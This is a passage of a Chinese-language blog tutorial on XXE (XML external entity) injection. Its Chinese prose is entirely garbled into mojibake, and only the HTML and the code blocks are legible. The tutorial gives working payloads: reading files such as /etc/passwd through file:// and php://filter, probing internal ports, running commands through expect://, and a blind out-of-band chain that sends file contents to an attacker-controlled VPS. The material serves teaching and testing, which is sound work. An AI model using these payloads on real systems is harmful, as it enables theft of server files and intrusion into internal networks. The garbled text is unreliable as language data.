å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å¹²æ‰°åº”ç”¨ç¨‹åºå¯¹ XML æ•°æ®çš„å¤„ç†ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…æŸ¥çœ‹åº”ç”¨ç¨‹åºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œå¹¶ä¸åº”ç”¨ç¨‹åºæœ¬èº«å¯ä»¥è®¿é—®çš„ä»»ä½•åç«¯æˆ–å¤–éƒ¨ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€è½¬åŒ–ä¸ºSSRFã€‘ã€‚</p><h1 id="ä¸‰ã€æ¼æ´æˆå› "><a href="#ä¸‰ã€æ¼æ´æˆå› " class="headerlink" title="ä¸‰ã€æ¼æ´æˆå› "></a>ä¸‰ã€æ¼æ´æˆå› </h1><p>XXE(XML External Entity Injection)ä¹Ÿå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼ŒXMLæ–‡ä»¶çš„è§£æä¾èµ–libxml åº“ï¼Œè€Œã€ libxml2.9 ã€‘ä»¥å‰çš„ç‰ˆæœ¬ã€é»˜è®¤æ”¯æŒå¹¶å¼€å¯äº†å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨ã€‘ï¼ŒæœåŠ¡ç«¯è§£æç”¨æˆ·æäº¤çš„XMLæ–‡ä»¶æ—¶ï¼Œæœªå¯¹XMLæ–‡ä»¶å¼•ç”¨çš„å¤–éƒ¨å®ä½“ï¼ˆå«å¤–éƒ¨ä¸€èˆ¬å®ä½“å’Œå¤–éƒ¨å‚æ•°å®ä½“ï¼‰åšåˆé€‚çš„å¤„ç†ï¼Œå¹¶ä¸”å®ä½“çš„URLæ”¯æŒ file:// å’Œ ftp:// ç­‰åè®®ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆã€ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ã€‘ç­‰å±å®³ã€‚XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><p>å½“åº”ç”¨æ˜¯é€šè¿‡ã€ç”¨æˆ·ä¸Šä¼ çš„XMLæ–‡ä»¶æˆ–POSTè¯·æ±‚è¿›è¡Œæ•°æ®çš„ä¼ è¾“ã€‘ï¼Œå¹¶ä¸”åº”ç”¨ã€æ²¡æœ‰ç¦æ­¢XMLå¼•ç”¨å¤–éƒ¨å®ä½“ã€‘ï¼Œä¹Ÿã€æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®ã€‘ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”ŸXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼Œå³XXEæ¼æ´ã€‚</p><h1 id="å››ã€æ¼æ´å±å®³"><a href="#å››ã€æ¼æ´å±å®³" class="headerlink" title="å››ã€æ¼æ´å±å®³"></a>å››ã€æ¼æ´å±å®³</h1><ul><li>å‘èµ·DOSæ”»å‡»</li><li>ä»»æ„æ–‡ä»¶è¯»å–</li><li>å‘½ä»¤æ‰§è¡Œ</li><li>å†…ç½‘ç«¯å£æ‰«æ</li><li>å†…ç½‘æ¸—é€</li></ul><h1 id="äº”ã€æ¼æ´åˆ©ç”¨"><a href="#äº”ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="äº”ã€æ¼æ´åˆ©ç”¨"></a>äº”ã€æ¼æ´åˆ©ç”¨</h1><h2 id="5-1-å¦‚ä½•æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#5-1-å¦‚ä½•æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="5.1 å¦‚ä½•æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥"></a>5.1 å¦‚ä½•æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥</h2><h3 id="5-1-1-ç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜"><a href="#5-1-1-ç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜" class="headerlink" title="5.1.1 ç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜"></a>5.1.1 ç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜</h3><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212160545955.png" style="zoom:67%;"><h3 id="5-1-2-ä¸€èˆ¬å¤–éƒ¨å®ä½“"><a href="#5-1-2-ä¸€èˆ¬å¤–éƒ¨å®ä½“" class="headerlink" title="5.1.2 ä¸€èˆ¬å¤–éƒ¨å®ä½“"></a>5.1.2 ä¸€èˆ¬å¤–éƒ¨å®ä½“</h3><p>é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜å¼•å…¥å¤–éƒ¨DTDæ–‡æ¡£ï¼Œå†å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212160702467.png" style="zoom:70%;"><h3 id="5-1-3-å‚æ•°å¤–éƒ¨å®ä½“"><a href="#5-1-3-å‚æ•°å¤–éƒ¨å®ä½“" class="headerlink" title="5.1.3 å‚æ•°å¤–éƒ¨å®ä½“"></a>5.1.3 å‚æ•°å¤–éƒ¨å®ä½“</h3><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212160714996.png" style="zoom:80%;"><h2 id="5-2-æ”¯æŒçš„åè®®"><a href="#5-2-æ”¯æŒçš„åè®®" class="headerlink" title="5.2 æ”¯æŒçš„åè®®"></a>5.2 æ”¯æŒçš„åè®®</h2><p>å…¶ä¸­phpæ”¯æŒçš„åè®®ä¼šæ›´å¤šä¸€äº›ï¼Œä½†éœ€è¦ä¸€å®šçš„æ‰©å±•æ”¯æŒï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212160838664.png" style="zoom:50%;"><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212160859665.png" style="zoom:57%;"><p>å¯¹äº PHPï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fileï¼šå¯ç”¨ file://æ–‡ä»¶åœ°å€ï¼Œæ¥è¯»å–æ–‡ä»¶httpï¼šå¯ä»¥è®¿é—® HTTP<span class="token punctuation">(</span>S<span class="token punctuation">)</span> ç½‘å€FTPï¼šè®¿é—® FTPPHPï¼šè®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµzlibï¼šå‹ç¼©æµdataï¼šæ•°æ®globï¼šæŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶æ ¼å¼è·¯å¾„expectï¼šå¤„ç†äº¤äº’å¼çš„æµï¼Œå¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†éœ€è¦å…ˆå®‰è£…ç›¸åº”æ’ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-3-è¯»å–æ•æ„Ÿæ•°æ®"><a href="#5-3-è¯»å–æ•æ„Ÿæ•°æ®" class="headerlink" title="5.3 è¯»å–æ•æ„Ÿæ•°æ®"></a>5.3 è¯»å–æ•æ„Ÿæ•°æ®</h2><h3 id="5-3-1-è¯»å–æ–‡ä»¶æ—¶æœ‰ç‰¹æ®Šç¬¦å·"><a href="#5-3-1-è¯»å–æ–‡ä»¶æ—¶æœ‰ç‰¹æ®Šç¬¦å·" class="headerlink" title="5.3.1 è¯»å–æ–‡ä»¶æ—¶æœ‰ç‰¹æ®Šç¬¦å·"></a>5.3.1 è¯»å–æ–‡ä»¶æ—¶æœ‰ç‰¹æ®Šç¬¦å·</h3><p>åœ¨è¯»å–æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶ä¸­åŒ…å«<code>&lt;,&gt;,&amp;</code>ç­‰è¿™äº›ç‰¹æ®Šç¬¦å·æ—¶ï¼Œä¼šè¢«xmlè§£æå™¨è§£æï¼ŒæŠ¥é”™ä»è€Œå¯¼è‡´è¯»å–å¤±è´¥ã€‚</p><p>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æŠŠè¯»å–çš„æ–‡ä»¶æ”¾åœ¨CDATAä¸­ä¹‹åå†è°ƒç”¨:</p><blockquote><h4 id="EX-è¯»å–æ–‡ä»¶æœ‰ç‰¹æ®Šç¬¦å·æ—¶çš„å¤„ç†"><a href="#EX-è¯»å–æ–‡ä»¶æœ‰ç‰¹æ®Šç¬¦å·æ—¶çš„å¤„ç†" class="headerlink" title="EX:è¯»å–æ–‡ä»¶æœ‰ç‰¹æ®Šç¬¦å·æ—¶çš„å¤„ç†"></a>EX:è¯»å–æ–‡ä»¶æœ‰ç‰¹æ®Šç¬¦å·æ—¶çš„å¤„ç†</h4><p>ä¾‹å¦‚å°è¯•è¯»å–ä»¥ä¸‹æ–‡ä»¶<code>C:\test.txt</code>çš„å†…å®¹ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161158093.png" style="zoom:80%;"><p>payload:</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161231652.png" style="zoom:80%;"><p>æŠ¥é”™ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161307606.png" style="zoom:65%;"><p>æ”¾åœ¨CDATAä¸­ä¹‹åå†è°ƒç”¨ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161332992.png" style="zoom:70%;"><p>ä½†æ˜¯è¿˜æ˜¯è¯»ä¸å‡ºæ¥ã€‚</p><p>åœ¨xmlä¸­ï¼Œxml è§£æå™¨æœ‰ä¸ªé™åˆ¶ï¼šä¸èƒ½åœ¨å†…éƒ¨ Entity ä¸­å¼•ç”¨ï¼Œâ€œPEReferences forbidden in internal subset in Entity â€æŒ‡çš„å°±æ˜¯ç¦æ­¢å†…éƒ¨å‚æ•°å®ä½“å¼•ç”¨ã€‚</p><p>æ­£ç¡®çš„payloadï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161510930.png" style="zoom:60%;"><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161608563.png" style="zoom:100%;"></blockquote><h3 id="5-3-2-æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨"><a href="#5-3-2-æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨" class="headerlink" title="5.3.2 æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨"></a>5.3.2 æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨</h3><p>åœ¨æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°†è¯»å–çš„æ–‡ä»¶å¸¦å‡ºæ¥ã€‚å°†æ–‡ä»¶èµ‹ç»™å®ä½“åå¸¦ç€è®¿é—®æˆ‘ä»¬çš„vpsç„¶ååœ¨æ—¥å¿—æ–‡ä»¶ä¸­å°±èƒ½çœ‹åˆ°æˆ‘ä»¬è¯»å–çš„æ–‡ä»¶äº†ã€‚</p><p>OOB(Out-Of-Band)ï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Blind XXE æ¼æ´æ¥æ„å»ºä¸€æ¡å¤–å¸¦æ•°æ®OOB(Out-Of-Band)é€šé“æ¥è¯»å–æ•°æ®ã€‚</p><p>é”™è¯¯è·å–æ•°æ®ï¼šé€šè¿‡æ„é€ dtdç„¶åä»é”™è¯¯ä¸­è·å–æ•°æ®ã€‚</p><ul><li>é€šè¿‡OOBè¿›è¡Œç›®å½•æµè§ˆå’Œä»»æ„æ–‡ä»¶è¯»å–ï¼š</li></ul><p>æ³¨ï¼šLinuxæœºå™¨å¯ä»¥ç›®å½•æµè§ˆå’Œä»»æ„æ–‡ä»¶è¯»å–ï¼ŒWindowsæœºå™¨åªèƒ½ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>åŠ¨æœºï¼šBlind XXEæ˜¯ç”±äºè™½ç„¶ç›®æ ‡æœåŠ¡å™¨åŠ è½½äº†XMLæ•°æ®ï¼Œä½†æ˜¯ä¸å›æ˜¾è¯»å–çš„æ•°æ®ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥æƒ³å…¶ä»–çš„åŠæ³•ï¼Œå°†æœåŠ¡å™¨è¯»å–çš„æ•°æ®ä¼ é€ç»™æˆ‘ä»¬çš„VPSå‘¢ï¼Ÿ</p><p>VPSçš„æ“ä½œï¼š</p><p>é¦–å…ˆï¼Œåœ¨æˆ‘ä»¬çš„VPSä¸Šæ­å»ºä¸€ä¸ªhttpæœåŠ¡ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªxml.dtdæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212163037495.png" style="zoom:53%;"><p>ç„¶ååœ¨VPSä¸Šç”¨pythonåœ¨2121ç«¯å£èµ·å¦ä¸€ä¸ªhttpæœåŠ¡ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212163057256.png" style="zoom:50%;"><p>POSTæäº¤çš„æ•°æ®ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212163136377.png" style="zoom:50%;"><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % remote SYSTEM "http://VPSçš„httpæœåŠ¡/xml.dtd"&gt;      &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Users/mi/Desktop/1.txt"&gt;    %remote;    %send;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœè¯»å–çš„æ–‡ä»¶æ•°æ®æœ‰ç©ºæ ¼çš„è¯ï¼Œè¿™æ ·çš„è¯»ä¸å‡ºæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨base64ç¼–ç ã€‚</p><p>æ•ˆæœï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212163305552.png" style="zoom:80%;"><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212163318524.png" style="zoom:63%;"><p>å¦‚æœç›®æ ‡æ˜¯JAVAç¯å¢ƒçš„è¯ï¼Œå»ºè®®é‡‡ç”¨FTPåè®®ã€‚</p><blockquote><h4 id="EX-æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨"><a href="#EX-æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨" class="headerlink" title="EX:æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨"></a>EX:æ— å›æ˜¾xxeæ¼æ´åˆ©ç”¨</h4><p>å°†/etc/passwdæ–‡ä»¶èµ‹ç»™å®ä½“testï¼Œåœ¨è®¿é—®<code>http://www.aaaaahui.com/?%test</code>æ—¶ï¼Œæˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„æ—¥å¿—æ–‡ä»¶å°±ä¼šä¿å­˜/etc/passwdçš„æ–‡ä»¶å†…å®¹ã€‚</p><p>payloadï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212161912562.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#x25\;æ˜¯%çš„htmlå®ä½“ç¼–ç ï¼Œå› ä¸ºåœ¨xml.dtdçš„å®ä½“ä¸­ä¸èƒ½æœ‰%</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•ˆæœ:</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212162041518.png" style="zoom:70%;"></blockquote><h3 id="5-3-3-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#5-3-3-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="5.3.3 ä»»æ„æ–‡ä»¶è¯»å–"></a>5.3.3 ä»»æ„æ–‡ä»¶è¯»å–</h3><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„XMLä»£ç POSTè¯·æ±‚ç¤ºä¾‹ï¼Œä¸Šè¿°ä»£ç å°†äº¤ç”±æœåŠ¡å™¨çš„XMLå¤„ç†å™¨è§£æã€‚ä»£ç è¢«è§£é‡Šå¹¶æœ‰å›æ˜¾æ•°æ®ã€‚</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212162256155.png" style="zoom:80%;"><p>è¿™é‡Œæˆ‘ä»¬å¼•ç”¨å¤–éƒ¨DTDå®ä½“ï¼Œå¹¶ä¸”å°† email çš„å€¼ä¿®æ”¹ä¸ºå¼•ç”¨å¤–éƒ¨å®ä½“çš„å€¼ &amp;file;   å› ä¸ºï¼Œè¿”å›åŒ…ä¼šè¿”å›emailçš„å€¼ï¼Œæ‰€ä»¥è¿”å›åŒ…ä¼šè¯»å–æˆ‘ä»¬å¼•ç”¨çš„ /etc/passwd çš„å€¼è¿”å›ç»™æˆ‘ä»¬ï¼Œé€ æˆäº†ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212162305321.png" style="zoom:80%;"><h3 id="5-3-4-ç«¯å£æ‰«æ"><a href="#5-3-4-ç«¯å£æ‰«æ" class="headerlink" title="5.3.4 ç«¯å£æ‰«æ"></a>5.3.4 ç«¯å£æ‰«æ</h3><p>åŸç†ï¼šä½¿ç”¨ http URI å¹¶å¼ºåˆ¶æœåŠ¡å™¨å‘æˆ‘ä»¬æŒ‡å®šçš„ç«¯ç‚¹å’Œç«¯å£å‘é€GETè¯·æ±‚ï¼Œå°† XXE è½¬æ¢ä¸ºSSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</p><p>ä»¥ä¸‹ä»£ç å°†å°è¯•ä¸ç«¯å£é€šä¿¡ï¼Œæ ¹æ®å“åº”æ—¶é—´/é•¿åº¦ï¼Œæ”»å‡»è€…å°†å¯ä»¥åˆ¤æ–­è¯¥ç«¯å£æ˜¯å¦å·²è¢«å¼€å¯ã€‚</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212162737213.png" style="zoom:50%;"><p>æ¢æµ‹æœ¬åœ°81ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œå¦‚æœä¸å¼€æ”¾ï¼Œåˆ™å“åº”æ—¶é—´æ¯”è¾ƒä¹…ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212162758127.png" style="zoom:60%;"><p>æ¢æµ‹æœ¬åœ°80ç«¯å£ï¼Œå¼€æ”¾ï¼Œå“åº”æ—¶é—´å¾ˆå¿«é€Ÿï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212162816762.png" style="zoom:60%;"><h3 id="5-3-5-è¿œç¨‹ä»£ç æ‰§è¡ŒRCE"><a href="#5-3-5-è¿œç¨‹ä»£ç æ‰§è¡ŒRCE" class="headerlink" title="5.3.5 è¿œç¨‹ä»£ç æ‰§è¡ŒRCE"></a>5.3.5 è¿œç¨‹ä»£ç æ‰§è¡ŒRCE</h3><p>åŸç†ï¼š</p><p>ç”±äºé…ç½®ä¸å½“/å¼€å‘å†…éƒ¨åº”ç”¨å¯¼è‡´çš„ã€‚</p><p>âš ï¸ï¼š è¿™ç§æƒ…å†µå¾ˆå°‘å‘ç”Ÿï¼Œä½†æœ‰äº›æƒ…å†µä¸‹æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡XXEæ‰§è¡Œä»£ç </p><p>ä¾‹å­ï¼šPHP expectæ¨¡å—è¢«åŠ è½½åˆ°äº†æ˜“å—æ”»å‡»çš„ç³»ç»Ÿæˆ–å¤„ç†XMLçš„å†…éƒ¨åº”ç”¨ç¨‹åºä¸Š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212164313463.png" style="zoom:67%;"><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212164333453.png" style="zoom:67%;"><h2 id="åˆ©ç”¨æ‰‹æ®µå°ç»“"><a href="#åˆ©ç”¨æ‰‹æ®µå°ç»“" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µå°ç»“"></a>åˆ©ç”¨æ‰‹æ®µå°ç»“</h2><ul><li>è¯»å– txt æ ¼å¼çš„æ–‡ä»¶ï¼ˆfile åè®®ï¼‰</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY test SYSTEM "file:///var/www/html/test.txt"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è¯»å– PHP æ ¼å¼çš„æ–‡ä»¶ï¼ˆä½¿ç”¨ PHP åè®®ï¼‰</li></ul><p>å› ä¸º PHP ä¸­æœ‰ <code>&lt;?php ?&gt;</code>ï¼Œå½“ XML è§£ææ—¶ï¼Œé‡åˆ° <code>&lt;?</code> è¿™ç±»çš„ç¬¦å·æ—¶ï¼Œä¼šå°† PHP å½“åš XML å»è§£æï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œæ•…éœ€è¦å°†å…¶è¿›è¡Œ base64 ç¼–ç è¯»å‡ºã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span>&amp;test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ¢æµ‹ç«¯å£æ˜¯å¦å¼€å¯ï¼ˆHTTP åè®®)</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY test SYSTEM "http://127.0.0.1:3306"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span>&amp;test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ‰§è¡Œå‘½ä»¤ï¼ˆexpect åè®®ï¼‰</li></ul><p>è‹¥æƒ³æ‰§è¡Œåè®®ï¼Œåˆ™éœ€è¦ç›®æ ‡ä¸»æœºä¸Šã€å®‰è£…äº† expect æ’ä»¶ï¼Œå¹¶ä¸”åšäº†ç›¸å…³é…ç½®ã€‘ã€‚æ¡ä»¶è¾ƒè‹›åˆ»ï¼Œæ‰€ä»¥æ¯”è¾ƒå°‘è§ã€‚åŒæ—¶è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼šæ‰€æ‰§è¡Œçš„å‘½ä»¤ä¸å…è®¸å«æœ‰ç©ºæ ¼ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY test SYSTEM "expect://ls"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">&gt;</span></span>&amp;test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Blind XXE</li></ul><p>è‹¥æœåŠ¡å™¨æ²¡æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆåªèƒ½ä½¿ç”¨ Blind XXE æ¥æ„å»ºä¸€æ¡å¸¦å¤–æ•°æ® (OOB) é€šé“æ¥è¯»å–æ•°æ®ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % file SYSTEM "file///filename"&gt;&lt;!ENTITY % remote SYSTEM "http://ip/test.xml"&gt;%remote;%send;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>æ•°æ®æœåŠ¡å™¨ä¸Šxml:&lt;!ENTITY % all"&lt;!ENTITY %#x25; send SYSTEM "http://ip/test.xml?p=%file;"&gt;"&gt;%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆè°ƒç”¨%remote,è°ƒç”¨åè®¿é—®è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„xml,ç„¶åæœåŠ¡å™¨ä¸Šçš„xmlä¸­çš„%allè¢«èµ‹äºˆäº†ä¸‹ä¸€è¡Œçš„å€¼,ç¬¬äºŒè¡Œä¸­çš„%sendå€¼åé¢çš„å¤–éƒ¨å‚æ•°ä½“å£°æ˜å°†SYSTEMåé¢çš„å†…å®¹èµ‹ç»™äº†%send,ä¹Ÿå°±æ˜¯ä¼ å…¥å®ä½“%fileè®¿é—®è¿œç¨‹æœåŠ¡å™¨ã€‚</p><h1 id="å…­ã€XXEæ¼æ´çš„æŒ–æ˜"><a href="#å…­ã€XXEæ¼æ´çš„æŒ–æ˜" class="headerlink" title="å…­ã€XXEæ¼æ´çš„æŒ–æ˜"></a>å…­ã€XXEæ¼æ´çš„æŒ–æ˜</h1><p>é€šè¿‡æ‰‹å·¥ç¯¡æ”¹ç½‘ç«™ä¸­xmlå®ä½“ä¸­çš„å¤´éƒ¨ï¼ŒåŠ å…¥ç›¸å…³çš„è¯»å–æ–‡ä»¶æˆ–è€…æ˜¯é“¾æ¥ï¼Œæˆ–è€…æ˜¯å‘½ä»¤æ‰§è¡Œç­‰ï¼Œçœ‹çœ‹èƒ½å¦æ˜¾ç¤ºå‡ºæ¥ã€‚å¦‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">file:///<span class="token 